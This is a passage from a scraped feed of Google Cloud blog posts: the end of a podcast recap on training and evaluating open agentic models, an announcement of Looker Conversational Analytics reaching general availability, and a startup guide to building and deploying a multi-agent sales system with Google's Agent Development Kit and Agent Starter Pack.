\"Insert\" to add characters or \"Remove\" to erase objects from existing video footage, giving creators iterative control.</span></p>\n</li>\n</ul>\n<h2><span style=\"vertical-align: baseline;\">Ravin Kumar on Building Open Models</span></h2>\n<p><span style=\"vertical-align: baseline;\">We sat down with Ravin to break down the end-to-end process of creating an open model with agent capabilities. It turns out the process mirrors a traditional ML lifecycle but with significantly more complex components.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Defining Agent Data</span></h3>\n<p><span style=\"vertical-align: baseline;\">Timestamp: </span><a href=\"https://youtu.be/7YgUDf_JXN8?si=r8PP24GP0o--DmQc&amp;t=895\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">14:55</span></a></p>\n<p><span style=\"vertical-align: baseline;\">Ravin explained that training data for agents looks vastly different from standard text datasets. It starts with identifying what users actually need. The data itself is a collection of trajectories, complex examples of the model making decisions and using tools. Ravin noted that they use a mix of human-curated data and synthetic data generated by their own internal \"teacher\" models and APIs to create a playground for the open models to learn in.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Training Techniques: SFT and Reinforcement Learning</span></h3>\n<p><span style=\"vertical-align: baseline;\">Timestamp: </span><a href=\"https://youtu.be/7YgUDf_JXN8?si=lGRLwhn00IBx5Vj0&amp;t=1034\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">17:14</span></a><span style=\"vertical-align: baseline;\"> </span></p>\n<p><span style=\"vertical-align: baseline;\">Once the data is ready, the training process involves a two-phase approach. First comes Supervised Fine-Tuning (SFT), where frameworks update the model's weights to nudge it into new behaviors based on the examples. However, to handle generalization—new situations not in the original trainin data—they rely on Reinforcement Learning (RL). Ravin highlighted the difficulty of setting rewards in RL, warning that models are prone to \"reward hacking,\" where they might collect intermediate rewards without ever completing the final task.</span></p>\n<h3><span style=\"vertical-align: baseline;\">The Stakes of Evaluation</span></h3>\n<p><span style=\"vertical-align: baseline;\">Timestamp: </span><a href=\"https://youtu.be/7YgUDf_JXN8?si=CiWVnqgYaDPV3MV7&amp;t=1211\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">20:10</span></a></p>\n<p><span style=\"vertical-align: baseline;\">Ravin emphasized that evaluation is the most critical and high-stakes part of the process. You can't just trust the training process; you need a rigorous \"final exam.\" They use a combination of broad public benchmarks to measure general capability and specific, custom evaluations to ensure the model is safe and effective for its intended user use case.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Conclusion</span></h2>\n<p><span style=\"vertical-align: baseline;\">This conversation with Ravin Kumar really illuminated that building open agentic models is a highly structured, rigorous process. It requires creating high-quality trajectories for data, a careful combination of supervised and reinforcement learning, and, crucially, intense evaluation.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Your turn to build</span></h2>\n<p><span style=\"vertical-align: baseline;\">As Ravin advised, the best place to start is at the end. Before you write a single line of training code, define what success looks like by building a small, 50-example final exam for your agent. If you can't measure it, you can't improve it. We also encourage you to try mixing different approaches; for example, using a powerful API model like Gemini as a router and a specialized open-source model for specific tasks.</span></p>\n<p><span style=\"vertical-align: baseline;\">Check out the full episode for more details, and catch us next time!</span></p>\n<h2><span style=\"vertical-align: baseline;\">Connect with us</span></h2>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Ivan Nardini → </span><a href=\"https://www.linkedin.com/in/ivan-nardini/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://x.com/ivnardini\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">X</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://bsky.app/profile/ivnardini.bsky.social\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Bsky</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Amit Maraj → </span><a href=\"https://www.linkedin.com/in/amit-maraj/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://x.com/agenticamit\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">X</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://www.tiktok.com/@agenticamit\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TikTok</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Ravin Kumar → </span><a href=\"https://www.linkedin.com/in/ravinakumar/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">LinkedIn</span></a></p>\n</li>\n</ul></div>",
        "published_date": "2025-11-14 10:03:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/business-intelligence/looker-conversational-analytics-now-ga/",
        "title": "Talk with and trust your data using Looker’s Conversational Analytics, now GA",
        "thumbnail": null,
        "author": "Richard Kuzma",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In a world of increasing data volume and demand, businesses are looking to make faster decisions and separate insight from noise. Today, we’re bringing </span><a href=\"https://docs.cloud.google.com/looker/docs/conversational-analytics-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Conversational Analytics</span></a><span style=\"vertical-align: baseline;\"> to general availability in </span><a href=\"https://cloud.google.com/looker\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Looker</span></a><span style=\"vertical-align: baseline;\">, delivering natural language queries to everyone in your organization, removing BI bottlenecks. With Conversational Analytics, we’re transforming the way you get answers, cutting through stale dashboards and accelerating data discovery. Our goal: make analytics and AI as easy and scalable as performing a Google search, extending BI to the broader enterprise as you go from prompt to full data exploration in seconds.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/1_jkplT4C.gif\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Instant AI-powered insights with Conversational Analytics in Looker</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We announced the </span><a href=\"https://cloud.google.com/blog/products/data-analytics/looker-bi-platform-gets-ai-powered-data-exploration\"><span style=\"text-decoration: underline; vertical-align: baseline;\">preview of Conversational Analytics at Google Cloud Next</span></a><span style=\"vertical-align: baseline;\"> in April. Since then, we’ve also extended the ability to leverage Google’s latest Gemini models with your own custom applications through the </span><a href=\"https://cloud.google.com/blog/products/data-analytics/understanding-lookers-conversational-analytics-api\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Conversational Analytics API</span></a><span style=\"vertical-align: baseline;\">, showcased productivity improvements that come from the </span><a href=\"https://cloud.google.com/blog/products/data-analytics/gemini-in-looker-deep-dive\"><span style=\"text-decoration: underline; vertical-align: baseline;\">convergence of AI and BI</span></a><span style=\"vertical-align: baseline;\">, and empowered today’s modern </span><a href=\"https://cloud.google.com/blog/products/business-intelligence/a-closer-look-at-looker-conversational-analytics\"><span style=\"text-decoration: underline; vertical-align: baseline;\">data analysts and developers</span></a><span style=\"vertical-align: baseline;\"> to do more, faster.</span></p>\n<p><span style=\"vertical-align: baseline;\">Now, with Conversational Analytics, getting an answer from your data is as simple as chatting with your most knowledgeable colleague. By tapping into human conversation, Conversational Analytics relieves you from struggling with complex dashboard filters, obscure field names, or the need to write custom SQL.</span></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">\"At YouTube, we're focused on helping creators succeed and bring their creativity to the world. We've been testing Conversational Analytics in Looker to give our partner managers instant, actionable data that lets them quickly guide creators and optimize creator support.\" </span><span style=\"vertical-align: baseline;\">- Thomas Seyller, Senior Director, Technology &amp; Insights, YouTube Business</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span></p>\n<p><span style=\"vertical-align: baseline;\">The general availability of Conversational Analytics combines the reasoning power of Gemini, new capabilities in Google’s agentic frameworks, and the trusted data modeling of the Looker platform. Together, these set the stage for the next chapter in self-service analytics, making reliable data insights accessible to the entire enterprise. Conversational Analytics agents can understand your questions and provide insightful answers to questions about your data.</span></p>\n<p><span style=\"vertical-align: baseline;\">New at general availability is the ability to analyze data across domains. You can ask questions that integrate insights from up to five distinct Looker Explores (pre-joined views), spanning multiple business areas. Additionally, you can share the agents you build with colleagues, giving them faster access to a single source of truth, speeding consensus, and driving uniform decisions.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2_pGc6nvS.gif\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>You can build and share agents with colleagues to have a consistent data picture.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Built on a trusted, governed foundation</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The power of Conversational Analytics isn't just in the conversation it enables; it's in the trust of the underlying data. Conversational Analytics is grounded in Looker’s </span><a href=\"https://cloud.google.com/blog/products/data-analytics/lookers-universal-semantic-model\"><span style=\"text-decoration: underline; vertical-align: baseline;\">semantic layer</span></a><span style=\"vertical-align: baseline;\">, which ensures that every metric, field, and calculation is centrally defined and consistent, acting as a crucial context engine for AI. As more of your colleagues rapidly use these expanded capabilities, you need to know the results they see and act on are accurate.</span></p>\n<p><span style=\"vertical-align: baseline;\">For analysts looking to explore data or everyday users receiving insights in the context of their business, Conversational Analytics also improves data self-service, minimizing technical friction that can create bottlenecks and leaves insights locked away.</span></p>\n<p><span style=\"vertical-align: baseline;\">You can now:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Ask anything, anytime: </strong><span style=\"vertical-align: baseline;\">Get instant answers to simple questions like “Show me our website traffic last month for shoe sales,” leading to deeper questions and greater insights across business areas and domains.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Deepen the discovery: </strong><span style=\"vertical-align: baseline;\">Move beyond the constraints of static dashboards and ask open-ended questions like, “Show me the trend of website traffic over the past six months and filter it by the California region.” The system intelligently generates the appropriate query and visualization instantly.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Extend enterprise BI: </strong><span style=\"vertical-align: baseline;\">Connect your Looker models to your enterprise BI ecosystem, centralize and share agents, and create new dashboards, starting with a prompt. Built on top of </span><a href=\"https://docs.cloud.google.com/looker/docs/creating-and-editing-explores\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Looker Explores</span></a><span style=\"vertical-align: baseline;\">, Conversational Analytics’ natural language interface usesLookML for fine tuning and output accuracy.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Pivot quickly:</strong><span style=\"vertical-align: baseline;\"> The conversational interface supports multi-turn questions, so you can iterate on your findings. Ask for total sales, then follow up with, \"Now show me that as an area chart, broken down by payment method.\"</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Gain full transparency:</strong><span style=\"vertical-align: baseline;\"> To build confidence and data literacy, the \"How was this calculated?\" feature provides a clear, natural language explanation of the underlying query that generated the results, so that you understand the source of your findings.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Empower the BI analyst and business user</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Conversational Analytics is democratizing data for business teams, helping them govern the business’s data. At the same time, it’s also enhancing productivity and influence for data analysts and developers.</span></p>\n<p><span style=\"vertical-align: baseline;\">When business users can self-serve trusted data insights, data analysts see fewer interruptions and “ad-hoc” ticket requests, and can instead focus on high-impact work. Analysts can customize their client teams’ BI experiences by building Conversational Analytics agents that define common questions, filters, and style guidelines, so different teams can act on the same data in different ways.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get ready to start talking</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Conversational Analytics is available now for all Looker platform users. Your admin can enable it in your Looker instance today and you will discover how easy it is to move from simply asking “What?” to confidently determining “What’s next?” For more information, review the </span><a href=\"https://docs.cloud.google.com/looker/docs/conversational-analytics-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">product documentation</span></a><span style=\"vertical-align: baseline;\"> or watch this </span><a href=\"https://www.youtube.com/watch?v=9_akO0Q9Z3k\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">video tutorial</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-13 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/startups/four-steps-for-startups-to-build-multi-agent-systems/",
        "title": "Technical guide: Four steps for startups to build multi-agent systems",
        "thumbnail": null,
        "author": "Oluwamayowa Awojuyigbe",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">AI agents are transforming the nature of work by automating complex workflows with speed, scale, and accuracy.  At the same time, startups are constantly moving, growing, and evolving – which means they need clear ways to implement agentic workflows, not piles of documentation that send precious resources into a tailspin.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we’ll share a simple four-step framework to help startups build multi-agent systems.  Multi-agentic workflows can be complicated, but there are easy ways to get started and see real gains without spending weeks in production. </span></p>\n<p><span style=\"vertical-align: baseline;\">In this post, we’ll show you a systematic, operations-driven roadmap for navigating this new landscape, using one of our projects to provide concrete examples for the concepts laid out in the </span><a href=\"https://cloud.google.com/resources/content/building-ai-agents\">official Startups technical guide: AI agents</a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Step #1: Build your foundation </span></h3>\n<p><span style=\"vertical-align: baseline;\">The startups technical guide outlines three primary paths for leveraging agents:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Pre-built Google agents</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Partner agents</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Custom-built agents (agents you build on your own).</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">To build our Sales Intelligence Agent, we needed to automate a highly specific, multi-step workflow that involved our own proprietary logic and would eventually connect to our own data sources. This required comprehensive orchestration control and tool definition that only a \"code-first\" approach could provide.</span></p>\n<p><span style=\"vertical-align: baseline;\">That’s why we chose Google's </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\"> as our framework. It offered the balance of power and flexibility necessary to build a truly custom, defensible system, combined with high-level abstractions for agent composition and orchestration that accelerated our development.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Step #2: Build out the engine </span></h3>\n<p><span style=\"vertical-align: baseline;\">We took a hybrid approach when building our agent architecture, which is managed by a top-level </span><span style=\"vertical-align: baseline;\">root_agent</span><span style=\"vertical-align: baseline;\"> in </span><a href=\"http://orchestrator.py\" rel=\"noopener\" target=\"_blank\"><span style=\"vertical-align: baseline;\">orchestrator.py</span></a><span style=\"vertical-align: baseline;\">. Its primary role is to act as an intelligent controller </span><span style=\"font-style: italic; vertical-align: baseline;\">using an LLM Agent for flexible user interaction</span><span style=\"vertical-align: baseline;\">, while delegating the core processing loop to </span><span style=\"font-style: italic; vertical-align: baseline;\">[more deterministic ADK components like </span><span style=\"font-style: italic; vertical-align: baseline;\">LoopAgent</span><span style=\"font-style: italic; vertical-align: baseline;\"> and custom </span><span style=\"font-style: italic; vertical-align: baseline;\">BaseAgent</span><span style=\"font-style: italic; vertical-align: baseline;\"> classes</span><span style=\"vertical-align: baseline;\">.</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Conversational onboarding: </strong><span style=\"vertical-align: baseline;\">The LLM Agent starts by acting as a conversational \"front-door,\" interacting with the user to collect their name and email.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Workflow delegation: </strong><span style=\"vertical-align: baseline;\">Once it has the user's information, it delegates the main workflow to a powerful LoopAgent defined in its sub_agents list.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Data loading: </strong><span style=\"vertical-align: baseline;\">The first step inside the LoopAgent is a custom agent called the CompanyLoopController. On the very first iteration of the loop, its job is to call our crm_tool to fetch the list of companies from the Google Sheet and load them into the session state.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Tool-based execution in a loop: </strong><span style=\"vertical-align: baseline;\"> The loop processes each company by calling two key tools: the </span><span style=\"vertical-align: baseline;\">research_pipeline</span><span style=\"vertical-align: baseline;\"> tool that encapsulates our complex </span><span style=\"vertical-align: baseline;\">company_researcher_agent</span><span style=\"vertical-align: baseline;\"> and the </span><span style=\"vertical-align: baseline;\">sales_briefing_agent</span><span style=\"vertical-align: baseline;\"> tool  that encapsulates the </span><span style=\"vertical-align: baseline;\">sales_briefing_agent</span><span style=\"vertical-align: baseline;\">. This \"Agent-as-a-Tool\" pattern is crucial for state isolation (more in Step 3).</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">This hybrid pattern gives us the best of both worlds: the flexibility of an LLM for user interaction and the structured, reliable control of a workflow agent with isolated, tool-based execution. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Step #3: Tools, state, and reliability</span></h3>\n<p><span style=\"vertical-align: baseline;\">An agent is only as powerful as the tools it can wield. To be truly useful, our system needed to connect to live data, not just a static local file. To achieve this, we built a custom tool, crm_tool.py, to allow our agent to read its list of target companies directly from a Google Sheet.</span></p>\n<p><span style=\"vertical-align: baseline;\">To build our read_companies_from_sheet function, we focused on two key areas:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Secure authentication</strong><span style=\"vertical-align: baseline;\">: We used a Google Cloud Service Account for authentication, a best practice for production systems. Our code includes a helper function, get_sheets_service(), that centralizes all the logic for securely loading the service account credentials and initializing the API client.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Configuration management:</strong><span style=\"vertical-align: baseline;\"> All configuration, including the SPREADSHEET_ID, is managed via our .env file. This decouples the tool's logic from its configuration, making it portable and secure.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">This approach transformed our agent from one that could only work with local data to one that could securely interact with a live, cloud-based source of truth.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Managing state in loops: The \"Agent-as-a-Tool\" Pattern</strong><span style=\"vertical-align: baseline;\"> A critical challenge in looping workflows is ensuring state isolation between iterations. ADK's </span><span style=\"vertical-align: baseline;\">session.state</span><span style=\"vertical-align: baseline;\"> persists, which can cause 'context rot' if not managed. Our solution was the </span><strong style=\"vertical-align: baseline;\">\"Agent-as-a-Tool\"</strong><span style=\"vertical-align: baseline;\"> pattern. Instead of running the complex </span><span style=\"vertical-align: baseline;\">company_researcher_agent</span><span style=\"vertical-align: baseline;\"> directly in the loop, we encapsulated its entire </span><span style=\"vertical-align: baseline;\">SequentialAgent</span><span style=\"vertical-align: baseline;\"> pipeline into a single, isolated </span><span style=\"vertical-align: baseline;\">AgentTool</span><span style=\"vertical-align: baseline;\"> (</span><span style=\"vertical-align: baseline;\">company_researcher_agent_tool</span><span style=\"vertical-align: baseline;\">).</span></p>\n<p><span style=\"vertical-align: baseline;\">Every time the loop calls this tool, the ADK provides a clean, temporary context for its execution. All internal steps (planning, QA loop, compiling) happen within this isolated context. When the tool returns the final </span><span style=\"vertical-align: baseline;\">compiled_report</span><span style=\"vertical-align: baseline;\">, the temporary context is discarded, guaranteeing a fresh start for the next company. This pattern provides perfect state isolation by design, making the loop robust without manual cleanup logic.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Step #4: Go from Localhost to a scalable deployed product </span></h3>\n<p><span style=\"vertical-align: baseline;\">Here is our recommended three-step blueprint for moving from a local prototype to a production-ready agent on Google Cloud.</span></p>\n<p><strong style=\"vertical-align: baseline;\">1. Adopt a production-grade project template<br /></strong><span style=\"vertical-align: baseline;\">Our most critical lesson was that a simple, local-first project structure is not built for the rigors of the cloud. The turning point for our team was adopting </span><a href=\"https://googlecloudplatform.github.io/agent-starter-pack/cli/create.html\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google's official Agent Starter Pack</span></a><span style=\"vertical-align: baseline;\">. This professional template is not just a suggestion; for any serious project, we now consider it a requirement. It provides three non-negotiable foundations for success out of the box:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Robust dependency management:</strong><span style=\"vertical-align: baseline;\"> It replaces the simplicity of local tools like Poetry with the production-grade power of PDM and uv, ensuring that every dependency is locked and every deployment is built from a fast, deterministic, and repeatable environment.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">A pre-configured CI/CD pipeline:</strong><span style=\"vertical-align: baseline;\"> It comes with a ready-to-use continuous integration and deployment pipeline for Google Cloud Build, which automates the entire process of testing, building, and deploying your agent.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Multi-environment support:</strong><span style=\"vertical-align: baseline;\"> The template is pre-configured for separate staging and production environments, a best practice that allows you to safely test changes in an isolated staging environment before promoting them to your live users.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The process begins by using the official command-line tool to generate your project's local file structure. This prompts you to choose a base template; we used the \"ADK Base Template\" and then moved our agent logic into the newly created source code files ( App) .</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# Ensure pipx is installed\\r\\npip install --user pipx\\r\\n\\r\\n# Run the project generator to create the local file structure\\r\\npipx run agent-starter-pack create your-new-agent-project&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c174edf0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The final professional project structure:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;final-agent-project/\\r\\n├── .github/              # Contains the automated CI/CD workflow configuration\\r\\n│   └── workflows/\\r\\n├── app/                  # Core application source code for the agent\\r\\n│   ├── __init__.py\\r\\n│   ├── agent_engine_app.py\\r\\n│   ├── orchestrator.py     # The main agent that directs the workflow\\r\\n│   ├── company_researcher/ # Sub-agent for performing research\\r\\n│   ├── briefing_agent/   # Sub-agent for drafting emails\\r\\n│   └── tools/              # Custom tools the agents can use\\r\\n├── tests/                # Automated tests for your agent\\r\\n├── .env                  # Local environment variables (excluded from git)\\r\\n├── pyproject.toml        # Project definition and dependencies\\r\\n└── uv.lock               # Locked dependency versions for speed and consistency&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c174e9a0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">With the local files created, the next step is to provision the cloud infrastructure. From inside the new project directory, you run the setup-cicd command. This interactive wizard connects to your Google Cloud and GitHub accounts, then uses Terraform under the hood to automatically build your entire cloud environment, including the CI/CD pipeline.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;# Navigate into your new project directory\\r\\ncd your-new-agent-project\\r\\n\\r\\n# Run the interactive CI/CD setup wizard\\r\\npipx run agent-starter-pack setup-cicd&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c174ec70&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">2. Cloud Build <br /></strong><span style=\"vertical-align: baseline;\">Once the setup is complete with the starter pack, your development workflow becomes incredibly simple. Every time a developer pushes a new commit to the main branch of your GitHub repository:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Google Cloud Build fetches your latest code.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">It builds your agent into a secure, portable container image. This process includes installing all the dependencies from your uv.lock file, guaranteeing a perfect, repeatable build every single time.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">It deploys this new version to your staging environment. Within minutes, your latest code is live and ready for testing in a real cloud environment.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">It waits for your approval. The pipeline is configured to require a manual \"Approve\" click in the Cloud Build console before it will deploy that exact same, tested version to your production environment. This gives you the perfect balance of automation and control.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">3. Deploy on Agent Engine and Cloud Run <br /></strong><span style=\"vertical-align: baseline;\">The final piece of the puzzle is where the agent actually runs. Cloud Build deploys your agent to Vertex AI Agent Engine, which provides the secure, public endpoint and management layer for your agent.</span></p>\n<p><span style=\"vertical-align: baseline;\">Crucially, Agent Engine is built on top of Google Cloud Run, a powerful serverless platform. This means you don't have to manage any servers yourself. Your agent automatically scales up to handle thousands of users, and scales down to zero when not in use, meaning you only pay for the compute you actually consume. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started</strong><span style=\"vertical-align: baseline;\"> </span></h3>\n<p><span style=\"vertical-align: baseline;\">Ready to build your own?</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Explore the</span><a href=\"https://github.com/Mayopepe/ai-agent-blog-series\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\"> code</span></a><span style=\"vertical-align: baseline;\"> for our Sales Intelligence Agent on GitHub.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Dive deeper with the </span><a href=\"https://cloud.google.com/resources/content/building-ai-agents?e=48754805&amp;hl=en\">Startups technical guide: AI agents</a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Get started with production deployments using the </span><a href=\"https://github.com/GoogleCloudPlatform/agent-starter-pack\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Starter Pack</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">No matter where you are with AI adoption, we are here to help. </span><a href=\"https://cloud.google.com/contact/form?hl=nl\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Contact our Startup team</span></a><span style=\"vertical-align: baseline;\"> today and you could get up to $350,000 USD in cloud credits with the </span><a href=\"https://cloud.google.com/startup/apply?utm_source=cloud_sfdc&amp;utm_medium=et&amp;utm_campaign=FY21-Q1-global-demandgen-website-cs-startup_program_mc&amp;utm_content=futureofai&amp;utm_term=-&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google for Startups Cloud Program</span></a><span style=\"vertical-align: baseline;\">,</span></p>\n</li>\n</ul>\n<hr />\n<p><sup><span style=\"font-style: italic; vertical-align: baseline;\">The technical journey and insights detailed in this blog post were the result of a true team effort. I want to extend my sincere appreciation to the core collaborators whose work provided the foundation for this article:</span><strong style=\"font-style: italic; vertical-align: baseline;\"> Luis Sala</strong><span style=\"font-style: italic; vertical-align: baseline;\">,</span><strong style=\"font-style: italic; vertical-align: baseline;\"> Isaac Attuah</strong><span style=\"font-style: italic; vertical-align: baseline;\">, </span><strong style=\"font-style: italic; vertical-align: baseline;\">Ishana Shinde</strong><span style=\"font-style: italic; vertical-align: baseline;\">, </span><strong style=\"font-style: italic; vertical-align: baseline;\">Andrew Thankson</strong><span style=\"font-style: italic; vertical-align: baseline;\">, and</span><strong style=\"font-style: italic; vertical-align: baseline;\"> Kristin Kim</strong><span style=\"font-style: italic; vertical-align: baseline;\">. Their hands-on contributions to architecting and building the agent were essential to the lessons shared here.</span></sup></p></div>",
        "published_date": "2025-11-13 17:00:00"
    },
    {
